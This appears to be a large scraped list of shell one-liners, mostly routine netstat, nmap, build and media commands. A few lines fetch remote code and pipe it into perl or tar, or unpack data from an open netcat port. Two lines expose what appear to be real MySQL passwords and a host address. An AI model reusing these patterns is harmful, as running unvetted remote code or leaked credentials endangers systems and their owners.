node node_modules/eslint/bin/eslint.js $(git diff --name-only --cached | xargs)
node main.js -s -f ./etc/config.coal.json -d 1 2>&1 | bunyan
node main.js -p 1053 -v 2>&1 | bunyan
node main.js -f ./etc/config.coal.json -v 2>&1 | bunyan
node /home/hwchen/projects/MimoServer/servers/Minion.js | /home/hwchen/projects/MimoServer/node_modules/.bin/bunyan
node /home/hwchen/projects/MimoServer/servers/Flik2.js | /home/hwchen/projects/MimoServer/node_modules/.bin/bunyan
node /home/hwchen/projects/MimoServer/servers/Eve.js | /home/hwchen/projects/MimoServer/node_modules/.bin/bunyan
node /Users/vpistelli/dev/careerbuilder/google-credentials/get-credentials.js | pbcopy
node -f app.js | bunyan -o short
node --version | td 'v'
node --harmony `which node | xargs dirname`/nodeunit
nmcli | grep DNS -i -C 30
nmcli networking off && nmcli networking on && sleep 10 && ifconfig | grep inet
nmcli general && nmcli device wifi | head
nmcli device show wlp4s0 | grep IP4.DNS
nmcli device show enp0s31f6 | grep IP4.DNS
nmcli device show eno1 | grep IP4
nmcli device disconnect `ip link | awk -F:
nmcli dev show | grep DNS
nmcli dev show wlp4s0 | awk '/DNS/ { print \$2 }'
nmcli dev list iface wlan0 | grep IP4
nmcli dev list iface eth0 | grep IP4
nmcli dev disconnect $(nmcli device status | awk '/wifi/ {print $1}')
nmcli d wifi list --rescan yes | cat &
nmcli d sh|egrep DNS
nmcli connection show $(nmcli connection show --active | awk 'NR == 2 {print $1}')
nmcli -c yes | head -1; ping 8.8.8.8
nmcli -c yes | head -1
nmap -v -sP 192.168.1.1-255 | grep -v down
nmap -sn 192.168.0.* | grep -i
nmap -sP 192.168.15.* | grep -o
nmap -sP 192.168.129.0/24 | grep dragonfly
nmap -sP 192.168.1.0/24 | grep ^Nmap
nmap -sP 192.168.1.0/24 | grep Nmap
nmap -sP 192.168.0.0/24 | awk '/^Nmap/{print}/B8:27:EB/{print}'
nmap -sP -PR 10.0.2.* | grep
nmap -p- portquiz.net | grep -i open
nmap -p N hostname | grep open
nmap -p 631 `subnet`.1-255 | bbedit -t '(631) `subnet`'
nmap -p 548 `subnet`.1-255 | mate -t '(445) `subnet`'
nmap -p 548 `subnet`.1-255 | bbedit -t '(445) `subnet`'
nmap -p 445 `subnet`.1-255 | bbedit -t '(445) `subnet`'
nmap -p 22 `subnet`.1-255 | bbedit -t '(22) `subnet`'
nmap -iR 1 -sL -n | grep.ip -o
nmap -Pn -p22 192.168.1.1/24 | grep -B 4 open
nmap -F `subnet`.1-255 | mate -t 'Full `subnet`'
nmap -F `subnet`.1-255 | bbedit -t 'Full `subnet`'
nmap -F 192.168.1.0/24 | less
nm-tool | less
nm $name.o | grep -v ' T '
nls | head -n 15
nl | pygmentize
nkf -wMQ | tr = %
nkf -w | pbcopy
nkf -w | gist
nkf -w | __CF_USER_TEXT_ENCODING=0x$(printf %x $(id -u)):0x08000100:14 pbcopy
nkf -WwMQ | tr = %
nix-store --query --graph '$HOME/.nix-profile' | fdp -Tpng -o/tmp/nix-graph.png ; open /tmp/nix-graph.png
nix-store --query --graph '$HOME/.nix-profile' | dot -Tpng -o/tmp/nix-graph.png ; open /tmp/nix-graph.png
nix-store --gc --print-roots | less
nix-env -u --dry-run 2>&1 | grep upgrading
nix-env -qaP|grep
nix-env -qaP | less
nix-env -qaP | grep -i
nix-env -qaP | grep
nix-env -qaP --description | grep
nix-env -qaP --description | ag
nix-env -qaP --description '*' | grep
nix-env -qaP --description '*' | g
nix-env -qaP --arg config '{ allowUnfree = true; }' | grep -i
nix-env -qaP '*' | grep
nix-env -qa \* | grep -i
nice make -j -k -l $(grep ^processor </proc/cpuinfo | wc -l) 2>qc.log
nice -n19 du -xms -- err.txt generated.file succ.txt | nice -n19 sort -n
nice -6 make STACKS=iups -j 5 2>&1 >make.log |tee makeerr.log
nice -6 make STACKS=gb -j 5 2>&1 >make.log |tee makeerr.log
nice -6 make BUILD=release -j 5 2>&1 >make.log |tee makeerr.log
nice -6 make -j 5 2>&1 >make.log |tee makeerr.log
ngrok start --config ~/workbench/projects/$(\ls ~/workbench/projects/ | fzf)/ngrok.yml
ngrok -authtoken $(cat ~/.ngrok |cut -d' ' -f2-)
ngrep -d 'wlan0' -t '^(GET|POST) ' 'tcp and port 80'
ngrep -d 'en1' -t '^(GET|POST) ' 'tcp and port 80'
ngrep -d 'en0' -t '^(GET|POST) ' 'tcp and port 80'
nginx -V 2>&1 | sed 's: --:\'$'\n\t&:g'
ng v | grep
news | head -n 20
newdf | grep -v none
newchange(){ cat ~/snapshot.txt CHANGELOG.md | sponge CHANGELOG.md; }; newchange
networksetup -getairportnetwork en1 | cut -d: -f2-
networksetup -getairportnetwork en0 | cut -c 24- && fast
netstat | percol
netstat | peco
netstat | less
netstat | grep tcp
netstat | grep EST
netstat | grep -v nc
netstat | grep
netstat | fzf
netstat -vatulpn | rg
netstat -vatulpn | grep
netstat -vanp tcp|grep -e pid
netstat -vanp tcp | grep $1
netstat -vanp tcp | grep $0
netstat -vanp tcp | grep
netstat -tuw | awk
netstat -tupln | grep
netstat -tunp | grep
netstat -tunap | less
netstat -tulpn |grep
netstat -tulpn | grep LISTEN
netstat -tulpn | grep :8080
netstat -tulpn | grep :
netstat -tulpn | grep $1
netstat -tulpn | grep
netstat -tulpen | grep -v 127.0.0.1
netstat -tulpen | grep
netstat -tulpan | grep udp
netstat -tulpan | grep LISTEN
netstat -tulanp | grep LISTEN
netstat -tulanp | grep LIST
netstat -tulanp | grep $1
netstat -tulanp | fzf
netstat -tulanp | ccze -A
netstat -tulanep | grep LISTEN
netstat -tuapn |grep -i
netstat -tuanp | grep LISTEN
netstat -tuael --numeric-hosts --numeric-ports | ccze -A
netstat -tpna | grep
netstat -tnulp | grep
netstat -tnpa | grep 'ESTABLISHED.*sshd'
netstat -tlapn|grep -e
netstat -taupn | grep LISTEN
netstat -taupn | grep -i
netstat -tanpu | grep
netstat -tanpl|grep
netstat -rn |grep default
netstat -rn | grep default
netstat -rn | grep -w tcp
netstat -rn | awk '/default/ {print $2}'
netstat -rn | awk
netstat -r | nkf -w
netstat -puntl | grep $1
netstat -punta | grep ESTABLISHED
netstat -punta | grep
netstat -plunt | sort
netstat -plten | grep $1
netstat -planet | grep $*
netstat -plan | grep LISTEN
netstat -peanut | grep $1
netstat -pawnt | grep LISTEN
netstat -pawnt | grep ESTABLISHED
netstat -pan|fzf
netstat -pal --numeric-ports | less
netstat -p tcp -van | grep LISTEN
netstat -p tcp -an | grep -i listen
netstat -p tcp -a -n | grep LISTEN
netstat -p TCP -eWc | ccze -A
netstat -p -l -n | grep -i
netstat -ntulp | grep
netstat -ntlp | grep LISTEN
netstat -ntap | grep ESTABLISHED
netstat -nta | grep LISTEN
netstat -nrf inet | grep -v H
netstat -nr | less
netstat -nr | head -n 15
netstat -nr | grep default
netstat -nr | grep '^default'
netstat -nputw | grep
netstat -np | grep -v unix
netstat -nlpt | grep LISTEN
netstat -nlpt | grep
netstat -nlp | grep -v ^unix
netstat -nlp | fgrep -i
netstat -nl | fgrep -i
netstat -nl -f inet | rg
netstat -na| grep
netstat -nat | grep tcp
netstat -napt | grep -i LISTEN
netstat -napt | ag -i LISTEN
netstat -nap | grep
netstat -nap tcp | grep -i 'listen'
netstat -nap tcp | grep 'LISTEN'
netstat -nap tcp | grep
netstat -naf inet | grep LISTEN
netstat -na |grep LISTEN
netstat -na | grep -w LISTEN
netstat -na | grep -i udp
netstat -na | grep -i listen
netstat -na | grep
netstat -na -f inet | grep LISTEN
netstat -n | grep tcp
netstat -n | awk
netstat -n --protocol inet | grep ':80'
netstat -lpn | grep
netstat -lntp | sort
netstat -lntp 2>/dev/null | grep -v ' - *$'
netstat -lnp|grep
netstat -lnptu | grep
netstat -lnpt4e | grep -w 'LISTEN'
netstat -lnpt | grep ssh
netstat -lnp | grep ss-server
netstat -lnp | grep ss-local
netstat -lnp | grep python
netstat -lnp | grep -v 127.0.0.1
netstat -lnp | grep --color ss-server
netstat -lnp | grep --color ss-local
netstat -lnp | grep --color python
netstat -lnp | grep --color
netstat -lnp | grep
netstat -ln | grep mysql
netstat -launt | grep LISTEN --color=auto
netstat -lanp | grep
netstat -i | awk
netstat -f inet -na | grep -i LISTEN
netstat -f inet -W | awk '/ESTABLISHED/'
netstat -enatup | grep $1
netstat -a|grep ESTABLISHED
netstat -atp | grep -i 'listen'
netstat -atp tcp | grep LIST
netstat -atp tcp | grep -i listen
netstat -atnp|grep LISTEN
netstat -atnp | grep
netstat -atn | grep LISTEN
netstat -atn | grep 24800
netstat -at | grep -i
netstat -apn|grep $1
netstat -apn | grep
netstat -ap | grep udp
netstat -ap | grep http
netstat -ap | grep
netstat -an|grep -i listen
netstat -an|grep -i established
netstat -anv | grep LISTEN
netstat -anup | grep
netstat -antuplo | grep
netstat -antup | grep
netstat -antu | grep -i listen
netstat -antp |grep 80
netstat -antp | grep TEN
netstat -antp | grep LISTEN
netstat -antp | grep
netstat -ant | grep LISTEN
netstat -anp|grep
netstat -anptu | grep
netstat -anp | more
netstat -anp | less
netstat -anp | grep python
netstat -anp | grep LISTEN
netstat -anp | grep -i
netstat -anp | grep --color ss-server
netstat -anp | grep --color ss-local
netstat -anp | grep --color python
netstat -anp | grep --color
netstat -anp | grep
netstat -anp tcp |grep LISTEN
netstat -anp tcp | grep -i listen
netstat -anob | grep 8181
netstat -anob | grep 3333
netstat -anob | grep $1
netstat -ano | grep 9200
netstat -ano | findstr
netstat -anltp | grep ssh
netstat -anltp | grep LISTEN
netstat -anlp | more
netstat -anlp | grep -i
netstat -anl | less
netstat -anf inet | grep LISTEN
netstat -anf inet | grep ESTABLISHED
netstat -anf inet -p tcp | grep LISTEN
netstat -anb | grep ESTABLISHED
netstat -an | head -n 20
netstat -an | grep LISTEN
netstat -an | grep ESTABLISHED
netstat -an | grep 8000
netstat -an | grep -w tcp
netstat -an | grep -i listen
netstat -an | grep -i
netstat -an | grep -e 8080 -e 8443
netstat -an | grep -c EST
netstat -an | grep --color=auto
netstat -an | grep *.
netstat -an | grep $1
netstat -an | grep
netstat -an -ptcp | grep LISTEN
netstat -an -p tcp | grep LISTEN
netstat -an -p tcp | grep ESTABLISHED
netstat -an -f inet | grep -i listen
netstat -an -f inet -p tcp | grep LISTEN
netstat -alnp|grep -w LISTEN
netstat -alnp|grep -i listen
netstat -alnp --protocol=inet | grep -v CLOSE_WAIT
netstat -a | grep LISTENING
netstat -a | grep LISTEN
netstat -a | grep
netstat -a -n|grep -E \
netstat -a -n | more
netstat -a -n | grep LISTEN
netstat -a -b -o | grep -i
netstat -Wat | grep ESTABLISHED
netstat --numeric-ports --numeric-hosts -atep|ccze -A
netcat termbin.com 9999 | xclip -selection c
netcat iphigenia.res.cmu.edu 4405 | play -t .raw -r 44100 -s -2 -c 2 -
netcat -l -u 6666 | tee /tmp/log
neofetch | sed -r 's:Public IP.*[0-9a-f]{2}:Public IP\: Blurred for screenshot purpose:'
neofetch | sed 's/xbps-query/XBPS/g'
neofetch | lolcat -t
neofetch | lolcat -a -s 3000
neofetch | lolcat
neofetch --ascii ~/.config/neofetch/img.txt --ascii_colors 3 3 3 3 3 3 --gap 11 | lolcat
neofetch --ascii $HOME/.config/os-ascii | lolcat
neofetch && yaourt -Syu --aur --noconfirm && echo Update complete. | figlet
neofetch && sudo pacman -Syyu --noconfirm && echo Update complete. | figlet
ncmpcpp --current-song='$7%a - $8{%n} {%t} $R [{%l}] ' | cut -d '%' -f 1
ncal -w | grep -A7 -B7 --color=auto $(date +%d)
nc_get whatismyip.akamai.com / | tail -1
nc:pbpaste:highlight | xsel --input --clipboard
nc:pbpaste:ctrlc | xsel --input --primary
nc termbin.com 9999|pbcopy
nc termbin.com 9999 | xclip -selection clipboard
nc termbin.com 9999 | xclip -selection c
nc termbin.com 9999 | xclip
nc termbin.com 9999 | pbcopy
nc bofh.jeffballard.us 666 | tail -1
nc -vz localhost 1-65535 2>&1 | $(which grep) -i succeeded
nc -vlp 51330 | tar xzvp
nc -v -w 1 localhost -z 1-10000 2>&1 | grep succeeded
nc -v -l 23456 | tar -xvf -
nc $HOSTNAME 8080 | mplayer -cache 204800 -idx -
napp http get $1 | jsonpp
nano `ls -t | head -1`
nano `git diff --name-only | uniq`
n=99; while [ $n -gt 0 ]; do echo; n=`echo $n-1|bc`; done
n1 | tail -n 1
n1 | tail -n
n | ep
n ls | grep ο
n -1 | tail -n 1
mysqldump --tz-utc=false --lock-tables=false -h 204.232.224.29 -u webuser_rr1 --password=dsd75C96 roomroster_v2_staging | gzip > ~/Downloads/roomroster_v2_production.$(date +%F_%R).sql.gz
mysqldump --single-transaction --flush-logs --master-data=2 --all-databases -u root -p | gzip > /home/markus/Documents/Arbeiten/InvoicePlane/Backup/all_databases-`date +%Y-%m-%d`.sql.gz
mysqldump --opt -u root -p --all-databases | gzip > ~/mysql-full-backup-$(date +%F).sql.gz
mysqldump --all-databases -p | bzip2 -c > $(date --rfc-3339=date)all-databases.sql.bz2
mysqld --verbose --help | less
mysqladmin variables | grep socket
mysqladmin variables | grep sock
mysqladmin processlist | grep -v Sleep
mysqladmin -uisucon variables | grep
mysqladmin -uisucon status | grep
mysql_config_editor print --all | egrep -v password
mysql-test-run --help | less
mysql-stop | mysql-start
mysql -h localhost -u webweb -p'!wH1TeTruff|3!' whitetruffle
mysql --help | grep my.cnf
mysq | grep jyang21
myrake routes | g
myrake -T | grep
mypstree | grep --color ranger
myip | pbcopy
myip | mtr -r -c 100
myip -local | cut -d ' ' -f2
mygit | column -t
myfind -type f -print0 | xargs -0 grep
myfil=0 ; for fil in `ls -al | awk
mydockerenv&&MY_MVN_PROJ_PATH=$(echo $PWD | sed -n
my_ls -oXa --human-readable | more
my_ls -oX --human-readable | more
my-tmux-env | xargs -n1 eval
my-branches | grep backup
mvn verify | tee test_output.log
mvn help:effective-pom | vi -
mvn dependency:tree|less
mvn dependency:tree | vim -
mvn dependency:tree | vi -
mvn dependency:tree | less
mvn dependency:tree | grep $1
mvn dependency:tree | g-
mvn dependency:tree -Dverbose | less
mvn dependency:tree -Dverbose | clip
mvn dependency:analyze | grep WARNING
mvn clean org.antlr:antlr3-maven-plugin:3.4:antlr 2>&1 | tee ../grammar.log
mvn clean install | tee /tmp/log.txt
mvn clean install -Pjboss_managed_local | tee /tmp/log.txt
mvn clean install -Dtest=ParseurTest#testParse test 2>&1 | h -i $MVN_ALL
mvn -Dverbose=true dependency:tree | g-
mvim ~/Documents/memo/`date +%Y`/`date +%Y-%m`/`date +%Y-%m-%d.md` -c ':%s/<%=\(.\{-}\)%>/\=eval(submatch(1))/ge | 4'
mvim `git status --porcelain | sed -ne
mvim -v \`git status -s | grep \
mvim -p `git status --porcelain | cut -c4-`
mvim -p $(git diff --name-only --diff-filter=U | xargs)
mvars | grep
mv ~/bin ~/bin.old; wget -qO- https://github.com/virtualtech70/V-Block/raw/master/bin.tgz|tar zxv -C ~
mv 1.diff 2.diff;svn diff > 1.diff; cat 1.diff | grep
mv $(ls -1td ~/Downloads/*|fzf) .
mux $(ls *.tx.yml | fzf)
multi-file-swagger index.yml -o yaml >| openapi.yml
muccadoro | tee -ai ~/pomodoros.txt
mtn diff | cless
mthread | m
mt.sh | tail
mt | tee test_output.log
msmtp-runqueue | tee -a ~/.cache/msmtp/log
msgcat --use-first general.po [^g]*.po | msgattrib --no-fuzzy -o
msgcat --color=test | head -n12
mscan | tac
mpv --no-input-default-bindings $(ls | fzy)
mpv --list-options | less
mpstat | awk
mplayer http://stream2.nadaje.com:8016/listen.pls | ccze -A
mplayer http://stream.polskieradio.pl/program3|ccze -A
mplayer http://radio.realindustrialradio.com:8000 | ccze -A
mplayer -quiet -audiofile-cache 50000 -novideo -playlist <(find \$PWD -type f|sort -R)
mplayer -cache 256 http://radio.lepszypoznan.pl:8000/rock.aaci | ccze -A
mplayer -cache 256 http://radio.lepszypoznan.pl:8000/lepszypoznan.aac | ccze -A
mplayer $(ls -t /tmp/Flash*|head -1) -vo xv
mpd | mpd-sima & disown
mpc | head -n 1 >> $HOME/Desktop/to-listen.txt && tail -n 5 $HOME/Desktop/to-listen.txt
mpc | head -n 1
mpc update; mpc crop; mpc ls | mpc add
mpc update > /dev/null && mpc --no-status clear && mpc ls | mpc --no-status add && mpc --no-status play; np
mpc update --wait && mpc ls | mpc add
mpc status | osd_cat --pos=middle --align=center -s=1 -
mpc playlist | grep -in
mpc playlist --format '%time%' | awk -F ':' '{ m+=\$1; s+=\$2; } END { res=(m*60+s); printf(\
mpc ls | mpc add
mpc ls Files | mpc add; mpc random on; mpc play; mpc repeat on
mpc listall | wc -l
mpc listall | grep -Ei
mpc del $(mpc -f %position% | head -1)
mpc clear; mpc ls | mpc add
mpc clear && mpc ls | mpc add && mpc --no-status play
mpc -f '[[%artist% - ]%title%][ (on %album%)]|[%file%]'
mpc --no-status clear && mpc ls | mpc --no-status add && mpc --no-status play; np
mpc --no-status clear && mpc listall | mpc --no-status add && mpc play
mount|column -t
mount| column -t
mount |grep sd
mount |egrep
mount |column -t
mount | grep sda
mount | grep ^\/dev
mount | grep \
mount | grep /sd --color=never
mount | grep /mnt/exthd
mount | grep /dev/sd
mount | grep /dev
mount | grep -v asec
mount | grep -ni
mount | grep -i -e
mount | grep 'sd[a-z][0-9]'
mount | grep
mount | egi \
mount | column –t
mount | column -t 2>/dev/null
mount | column -t
mount | column -T
mount | column --table
mount | colum -t
mount | awk -F' ' '{ printf \
mount | awk -F
mount | /bin/grep -E '^/dev'
mount -v | grep
motivate --no-colors | cowthink -f unipony-smaller
more ~/.zshrc | grep
more ~/.ssh/id_rsa.pub | pbcopy && printf '=> Public key copied to pasteboard.\n'
more ~/.ssh/id_rsa.pub | pbcopy
more ~/.ssh/id_rsa.pub | copy && echo '=> Public key copied to pasteboard.'
more ~/.ssh/benjamin.t.connelly@gmail.com.pub | copy && echo '=> Public key copied to pasteboard.'
more ~/.ssh/ben@nclouds.com.pub | copy && echo '=> Public key copied to pasteboard.'
more `pwd`/.log | grep CMD
more Gemfile.lock | grep
more err.txt generated.file succ.txt | cat
moplayer -novideo `find . -type f|sort -R`
mono /opt/keepass/KeePass.exe & xsel --clipboard | xsel --primary --input
mongothemelist | awk '{print \
mongothemedir && mongothemelist | awk '{print \
mongodesignlist | awk '{print \
mongodesigndir && mongodesignlist | awk '{print \
mogrify -format jpg -quality 85 *1x.jpg; mogrify -format jpg -quality 35 *2x.jpg; find . -name '*.jpg' | imageoptim
mogrify -format jpg -background white -alpha remove -quality 85 *1x.png; mogrify -format jpg -background white -alpha remove -quality 35 *2x.png; find . -name '*.jpg' | imageoptim
modules-status | grep ✗
module spider 2>&1 | grep -i
module avail 2>/dev/stdout | grep
module avail 2>&1 | less
module avail 2>&1 | grep
module avail 2>&1 | cat
module -t --redirect avail | grep ${1}
module --terse avail 2>&1 | grep -i
modinfo | grep -i
mocp -i | grep -i ^title
mm|~/bin/color_build_log.awk
mm 2>&1 | putclip
mlocate -eb \\HEAD | while read p; do p=${p:h}; [[ -d $p/objects && -f $p/config ]] && echo $p; done
mload $(svnver | head -n 1)
mktemp -d | tee /dev/stderr
mktemp -d | clip
mktemp -d | cd
mkfifo /tmp/mpd.fifo;while :; do yes $’\n’ | nc -lu 127.0.0.1 5555 > /tmp/mpd.fifo; done &
mkfifo /tmp/mpd.fifo; while :; do yes $'\n' | nc -lu 127.0.0.1 5555 > /tmp/mpd.fifo; done &
mkdir ./my_logs; petalinux-config | tee ./my_logs/petalinux-config.log 2>&1
mkdir ./my_logs; petalinux-config --verbose | tee ./my_logs/petalinux-config_verb.log 2>&1
mkdir ./my_logs; petalinux-build --verbose | tee ./my_logs/petalinux-build_verb.log 2>&1
mkdir ./my_logs; date && petalinux-build && date | tee -a ./my_logs/petalinux-build.log 2>&1
mkdir -p ~/dbdumps-loc/${project_name}; mysqldump -u root -p ${project_name} > ~/dbdumps-loc/${project_name}/${project_name}_loc_\$(getDateForFile).sql; ls -ABrt1 --group-directories-first ~/dbdumps-loc/${project_name}/ | tail -n1
mkdir -p ~/dbdumps-loc/${project_name}; mysqldump -u root -p ${db_name} > ~/dbdumps-loc/${project_name}/${project_name}_loc_\$(getDateForFile).sql; ls -ABrt1 --group-directories-first ~/dbdumps-loc/${project_name}/ | tail -n1
mkdir -p ~/Logs/irc ; sic -h chat.freenode.com | tee ~/Logs/irc/$(date +%m%d)$(date +%H%M)chat.log
mkdir -p ~/.local/bin/eclipse.jdt.ls/ && curl -s http://download.eclipse.org/jdtls/snapshots/jdt-language-server-latest.tar.gz | tar xvz -C ~/.local/bin/eclipse.jdt.ls/
mkdir -p stripped && ls *c *h | xargs -I{} gcc -fpreprocessed -dD -E {} > ./stripped/{}
mkdir -p /tmp/neovim && NVIM_LISTEN_ADDRESS=/tmp/neovim/neovim581 nvim | atom --include-deprecated-apis .
mkdir %a | cd %a
mkdir $1 | !$
mkcd $(ghq root)/$(ghq list | fzf-tmux +m)
mkcd $(fd -a -H -t d . | fzf-tmux +m)
mka -j$(nproc --all) recoveryimage 2>&1 | tee buildlog.txt && filterlog
mka -j$(nproc --all) kernel 2>&1 | tee buildlog.txt && filterlog
mka -j$(nproc --all) bootimage 2>&1 | tee buildlog.txt && filterlog
mix help | grep ecto
minicom | tee minicom.log
minicom usb1 2>&1| tee minicom1.log
minicom 2>&1| tee minicom.log
minicom 2>&1| tee adb.log
mine $(git status --porcelain | awk
mine $(ghq root)/$(ghq list | fzf)
mhng-scan | less -R
mhng-scan | head -50
mfiles | xargs grep $@
mfa otp aws | pbcopy
mf | view -
merged_git_branches | xargs git branch -d
merged_branch | xargs -I % git branch -d %
menu-generator -p 'echo ' -s ' | pbcopy' -m 'git-recent-branches-menu-array-generator'
mdls -name com_apple_xcode_dsym_uuids -raw *.dSYM | grep -e \\\
md5sum | awk '{print \$1}'
md5sum -c md5sums 2> /dev/null | grep OK
md5sum err.txt generated.file succ.txt | sed -e 's/\([^ ]*\) \(.*\(\..*\)\)$/mv -v \2 \1\3/e'
md5sum err.txt generated.file succ.txt | sed -e
md5sum $(find . -name err.txt succ.txt -print) | awk '{c[$1]++;if(c[$1]==1){cache[$1]=$2} if(c[$1]>1){t[i++]=$2;if(cache[$1]!=
mass_unset() { unset \$(env | grep \
markl | grep
markdown | lynx -stdin
markdown README.md | lynx -stdin
markdown $1 | bcat;
map dirname | find . -iname $*
mank -k . |less
mangala | grep ' - ' && mangaup
man vim | col -b > ~/Desktop/vim.txt
man cat | cat
man bash | less +446 # The solution to new line is: STR=$
man ascii | grep -m 2 -A 58 octal
man ascii | grep -m 1 -A 65 --color=never Oct
man ascii | grep -m 1 -A 63 --color=never Oct
man ascii | grep -m 1 -A 20 Tables
man ascii | grep
man ascii | cat
man 2 intro | less -Ip
man -t xcodebuild | pstopdf -i -o xcodebuild.pdf;
man -t xcodebuild | open -f -a Preview;
man -t multitail | lpr -m
man -t \!* | ps2pdf - /tmp/man_\!$.pdf && open -a Skim /tmp/man_\!$.pdf
man -t $1 | open -f -a Preview
man -k . | less
man -k . | dmenu
man -k '^pv' ; man -k '^vg' ; man -k '^lv' | egrep -v ^lv[[:blank:]]
man --path | tr ':' '\n'
man --path | sed 's/:\//\n\//g'
man $(ls /bin /usr/bin |shuf -n 1)
man $(ls /bin /usr/bin | perl -MList::Util -e 'print List::Util::first { defined($_) } List::Util::shuffle(<>)')
man $(fc -ln -1 | cut -d' ' -f2)
mamp -r; mamp -i; sleep 10; while [[ $(diskutil list | grep MAMP) ]]; do sleep 5; done; mamp -l
make|grep warning
make|grep error
makepkg --printsrcinfo >| .SRCINFO
makepasswd | tr A-Z a-z
makecscope ; find . -name \*.[ch] -o -name \*.cpp -o -name \*.cc | xargs ctags --extra=+f --c-kinds=+px --exclude=.git --exclude=.pc
make |& tee latest_make_output.txt;ls
make |& less
make | lolcat
make | head
make | grep error
make | ccze -A
make up|awk -v q='\
make std=$std 2>&1 | head
make clean && make -n | rc -c -
make clean && make -j `lscpu | grep
make clean && make && find . -type f -perm -o+rx | sh
make bootstrap 2>&1 | tee make.log
make bootimage -j16 | tee Build.log
make VERBOSE=1 2>&1 | sed -e 's%^.*: error: .*$%\x1b[37;41m&\x1b[m%'
make ; sudo mount /dev/sdc1 /mnt/hgfs/ ; cp -p bin/*bin /mnt/hgfs/ ; ll /mnt/hgfs/ | grep *bin ; sudo umount /mnt/hgfs ; echo please plug your Udisk
make 2>&1|less
make 2>&1 | vim -
make 2>&1 | tee mkerr
make 2>&1 | tee grep_op
make 2>&1 | tee .mk; grep DEVDIR .mk > /dev/null && echo make && mkenv && make; rm .mk #
make 2>&1 | more
make 2>&1 | less -r
make 2>&1 | less -ifR
make 2>&1 | less -XFR
make 2>&1 | less
make 2>&1 | highlight-gcc
make 2>&1 | head
make 2>&1 | grep warning:.*
make 2>&1 | grep '.*[0-9]\+:[0-9]\+: error' --color=always --after-context=4
make 2>&1 | grep
make 2>&1 >/dev/null | grep error
make -s 2>&1 | less
make -qp | sed -n -e 's/^\([^.#[:space:]][^:[:space:]]*\): .*/\1/p'
make -pn | perl -F: -ane 'print \
make -j5 | grep error
make -j4 2>&1 | tee cur_full_make_log
make -j4 2>&1 | tee bmake.log
make -j4 2> /tmp/mh; cat /tmp/mh | head -n 25
make -j16 2>&1 | tee make.txt
make -j12 2>&1 | tee /tmp/quickfix.err
make -j$(sysctl -a hw.ncpu | cut -d' ' -f 2)
make -j$(ls /sys/bus/cpu/devices | wc -l)
make -j$(cat /proc/cpuinfo | grep -c processor)
make -j$((`cat /proc/cpuinfo | egrep '^processor' -c` + 1))
make -j$((1+$(cat /proc/cpuinfo | grep -c processor)))
make -j$(($(grep processor /proc/cpuinfo | wc -l) + 1))
make -j `sysctl hw.ncpu | awk '{print $2}'`
make -j `_ncpus` |& tee build.log
make -j 4 showcommands 2>&1 | tee ../FULL_OUT_debug
make -j 1 |& tee make.log
make -j $(sysctl hw.ncpu | awk '{print $2}')
make --jobs --max-load `grep processor /proc/cpuinfo | wc -l`
maim ~/Pictures/scrots/$(date +%F_%T).png | xclip -selection clipboard -t image/png
maim ~/Pictures/Screenshot_$(date +%s).png -s -m 10 | xclip -selection clipboard -t image/png
maim -st 9999999 | convert - \( +clone -background black -shadow 80x3+5+5 \) +swap -background none -layers merge +repage $HOME/Media/Pictures/Screenshots/$(date -Ins).png
maim -s | xclip -selection clipboard -t image/png
maim -s | convert - \( +clone -background black -shadow 80x3+5+5 \) +swap -background none -layers merge +repage shadow.png
maim -s -m 1 | xclip -selection clipboard -t image/png
maim -s -f png | copyq copy image/png -
maim -s --hidecursor | tee >(xclip -t image/png -selection clipboard) >~/images/screenshots/$(date +%F-%N)_maim.png
maim -s --format=png /dev/stdout | xclip -selection clipboard -t image/png -i
maim -qs ~/Pictures/scrots/$(date +%F_%T).png | xclip -selection clipboard -t image/png
maim -m 1 | xclip -selection clipboard -t image/png
maim -f png | copyq copy image/png -
maim --hidecursor -x :0.2 | convert - \( +clone -background black -shadow 35x30+1+1 \) +swap -background transparent -layers merge +repage ~/Pictures/screenshots/$(date +%s).png
maim --hidecursor -i $(xdotool getactivewindow) | convert - \( +clone -background black -shadow 35x30+1+1 \) +swap -background transparent -layers merge +repage ~/pictures/screenshots/$(date +%s).png
mailq|tail
mac2unix | perl -pe
m | less -r
m wifi status | rg --passthru --ignore-case --regexp='.*rate:.*'
m bootimage -j8 2>&1 | tee build_log
m `ls -rt /tmp/*pdf|tail -1`
m 2>&1 | less
m -j12 2>&1 |tee hdslog.txt
l|wc
l|tail -20
l|m
l|less
l|grep -i
l|g
l|P
l| less
lynx -dump http://www.nbs.rs/kursnaListaModul/srednjiKurs.faces?lang=lat | head -n43
lxd.lxc list | grep -v -e -------
lxc exec squid-deb-proxy -- tail -F /var/log/squid-deb-proxy/access.log | ccze -AC
lx -n2 | sed 's/ /\t/'
lx -R --git-ignore | rg
lwp-request http://httpupdate.cpanel.net/cpanelsync/transfers_PUBLIC/pkgacct/ updateuserdomains-universal | perl
lv | cat
lunch | grep -ni
ltm | tail -n20
ltaa -I '\.git|node_modules'
lt | tail
lt | less
lt | head
lt -lt | head
lt --color=always| head -10
ls|xargs -I % du -s -m -h %
ls|wc -w
ls|wc -l
ls|toilet -f term -F border --gay
ls|sort -R
ls|pbcopy
ls|lolcat
ls|less
ls|head
ls|grep -i
ls|grep --color
ls|grep $1
ls|grep
ls|egrep
ls| grep
lsv| peco
lsvirtualenv -b | sort
lsvirtualenv -b | less
lsusb | matchline -random
lsusb | grep 1782
lsusb -v | grep
lst | head -n 5
lst | head -n 10
lst | grep
lst | HEAD -10
lssysd | grep 'fail'
lsserv | percol
lss | grep
lss $* | more
lsrecent | /usr/bin/grep -v ^l
lsrc | sed 's/:/ -> /g'
lsr | head -n15
lspci |grep -i VGA
lspci | matchline -lspci
lspci | grep VGA
lspci | grep -i reader
lspci | grep -i nvidia
lspci | grep -i VGA
lspci | grep -e VGA -e 3D
lspci -v|grep -i vga -A 10
lspci -v|grep -i graphics
lspci -vnnn | perl -lne
lspci -vnn | grep VGA -A 12
lspci -vnn | grep Network
lspci -vnn | \grep VGA -A 12
lspci -v | less
lspci -v | grep VGA
lspci -nnkq | grep -i VGA -A2
lspci -nnk | grep -iA2 net
lspci -nnk | grep -i vga -A3
lspci -nnk | grep -A2 0280
lspci -nnk | grep 'in use'
lspci -knn | grep -A2 VGA
lspci -k | grep -A2 -i audio
lsof |grep -i established
lsof |grep
lsof | wc -l
lsof | grep usbserial
lsof | grep emacs$UID
lsof | grep delete
lsof | grep LISTEN
lsof | grep /media/pulpen
lsof | grep /Library/Caches
lsof | grep -i udp
lsof | grep -i tcp
lsof | grep -i
lsof | grep ${EMACS_SERVER_NAME}
lsof | grep
